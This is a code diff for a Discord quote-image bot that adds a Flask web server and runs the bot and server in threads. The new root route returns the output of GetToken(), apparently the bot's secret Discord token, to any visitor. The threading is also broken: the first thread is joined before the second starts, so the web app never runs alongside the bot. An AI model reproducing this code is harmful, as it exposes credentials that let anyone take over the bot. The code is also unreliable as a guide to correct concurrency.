@@ -5,7 +5,8 @@ from io import BytesIO
 import random
 import json
 import os
-import sys
+from flask import Flask
+from threading import Thread
 import uuid
 
 # Constants
@@ -201,6 +202,11 @@ def CreateQuote(quote: str, author: str, sans: bool) -> str:
     filename = SaveQuote(quote, author, bgImg, sans)
     return filename
 
+# Flask web app
+webApp = Flask(__name__)
+@webApp.route('/')
+def ServeFlaskToken():
+    return GetToken()
 
 # Discord
 intents = discord.Intents.default()
@@ -271,5 +277,13 @@ async def on_message(message):
                 await message.channel.send("dm alex (lexicled) if you need anything else")
                 await message.channel.send("after all, im just a fuckin clanker lol")
             case _: await message.channel.send(GetErrorMessage(f"{PREFIX} [command: save/image/help]"))
-                
-client.run(GetToken())
+
+# Multithreading
+thread1 = Thread(target = client.run, args = (GetToken(), ))
+thread2 = Thread(target = webApp.run, args = ())
+
+thread1.start()
+thread1.join()
+
+thread2.start()
+thread2.join()
